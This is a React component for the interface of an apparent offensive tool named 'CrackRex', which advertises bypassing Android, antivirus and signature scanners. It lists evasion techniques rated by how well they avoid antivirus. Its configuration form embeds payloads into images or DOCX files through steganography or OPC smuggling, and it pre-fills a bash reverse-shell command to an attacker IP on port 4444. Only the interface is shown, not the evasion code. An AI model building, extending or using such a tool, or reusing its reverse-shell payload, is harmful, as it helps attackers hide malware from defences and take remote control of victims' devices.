import { motion } from 'motion/react';
import { EVASION_TECHNIQUES } from './data';
import Sidebar from './components/Sidebar';
import { Terminal, BrainCircuit, ShieldCheck, Database, Settings } from 'lucide-react';

export default function App() {
  return (
    <div className="min-h-screen bg-bg-deep flex">
      <Sidebar />
      
      <main className="flex-1 ml-64 p-8">
        <div className="max-w-6xl mx-auto">
          {/* Header */}
          <header className="mb-10">
            <h2 className="text-4xl font-bold tracking-tighter text-white mb-1 uppercase italic">Inject & Evade</h2>
            <p className="text-white/40 font-mono text-xs tracking-widest">Bypass Android 17+ / AV / signature scanners using advanced evasion techniques</p>
          </header>

          <div className="space-y-8">
            {/* Evasion Techniques Section */}
            <section>
              <div className="flex items-center gap-2 mb-4">
                <BrainCircuit className="w-5 h-5 text-matrix-teal" />
                <h3 className="text-matrix-teal text-sm font-bold tracking-[0.2em] uppercase">Evasion Techniques</h3>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {EVASION_TECHNIQUES.map((tech, index) => (
                  <motion.div
                    key={tech.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: index * 0.1 }}
                    className="tech-card group hover:border-matrix-teal/30 hover:bg-matrix-teal/5 transition-all duration-300"
                  >
                    <div className="flex justify-between items-start mb-3">
                      <h4 className="font-mono text-orange-400 text-sm font-bold tracking-tight">{tech.title}</h4>
                    </div>
                    <p className="text-xs text-white/50 leading-relaxed font-mono mb-4">
                      {tech.description}
                    </p>
                    <div className="flex items-center gap-2">
                      <span className="text-[10px] font-bold text-white/30 uppercase tracking-widest">AV Evasion:</span>
                      <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded border ${
                        tech.level === 'HIGH' 
                          ? 'text-green-400 border-green-400/20 bg-green-400/5' 
                          : 'text-yellow-400 border-yellow-400/20 bg-yellow-400/5'
                      }`}>
                        {tech.level}
                      </span>
                    </div>
                  </motion.div>
                ))}
              </div>
            </section>

            {/* Injection Configuration Section */}
            <section className="bg-card-dark/40 border border-white/5 rounded-xl p-8 backdrop-blur-md relative overflow-hidden">
              <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
                <ShieldCheck className="w-48 h-48 text-matrix-teal" />
              </div>

              <div className="flex items-center gap-2 mb-8 border-b border-white/5 pb-4">
                <Settings className="w-5 h-5 text-matrix-teal" />
                <h3 className="text-matrix-teal text-sm font-bold tracking-[0.2em] uppercase">Injection Configuration</h3>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
                <div className="space-y-4">
                  <div>
                    <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">Technique</label>
                    <div className="relative">
                      <select className="w-full bg-black/40 border border-white/10 rounded px-4 py-3 text-sm text-white/80 focus:outline-none focus:border-matrix-teal/50 appearance-none">
                        <option>auto — Let CrackRex choose best</option>
                        <option>DOCX OPC Smuggling</option>
                        <option>LSB Steganography</option>
                      </select>
                      <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-white/20">
                        <Database className="w-4 h-4" />
                      </div>
                    </div>
                  </div>

                  <div>
                    <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">Output Path</label>
                    <input 
                      type="text" 
                      placeholder="/tmp/output_evaded.png"
                      className="w-full bg-black/40 border border-white/10 rounded px-4 py-3 text-sm text-white/80 focus:outline-none focus:border-matrix-teal/50 font-mono"
                    />
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">Source File (Carrier)</label>
                    <input 
                      type="text" 
                      placeholder="/path/to/image.jpg or /path/to/doc.docx"
                      className="w-full bg-black/40 border border-white/10 rounded px-4 py-3 text-sm text-white/80 focus:outline-none focus:border-matrix-teal/50 font-mono placeholder:italic placeholder:text-white/20"
                    />
                  </div>
                </div>
              </div>

              <div className="mb-8">
                <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">Payload Code (Reverse Shell or Script)</label>
                <div className="relative group">
                  <div className="absolute inset-y-0 left-4 flex items-start pt-3 pointer-events-none opacity-20 group-focus-within:opacity-50 transition-opacity">
                    <Terminal className="w-4 h-4 text-white" />
                  </div>
                  <textarea 
                    rows={5}
                    defaultValue="bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
                    className="w-full bg-black border border-white/10 rounded p-4 pl-12 text-sm text-white/90 focus:outline-none focus:border-matrix-teal/50 font-mono leading-relaxed"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div>
                  <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">LHOST</label>
                  <input 
                    type="text" 
                    placeholder="192.168.1.100"
                    className="w-full bg-black/40 border border-white/10 rounded px-4 py-3 text-sm text-white/80 focus:outline-none focus:border-matrix-teal/50 font-mono"
                  />
                </div>
                <div>
                  <label className="block text-[10px] font-bold text-matrix-teal uppercase tracking-widest mb-2">LPORT</label>
                  <input 
                    type="number" 
                    placeholder="4444"
                    className="w-full bg-black/40 border border-white/10 rounded px-4 py-3 text-sm text-white/80 focus:outline-none focus:border-matrix-teal/50 font-mono"
                  />
                </div>
              </div>
            </section>
          </div>
        </div>
      </main>
    </div>
  );
}
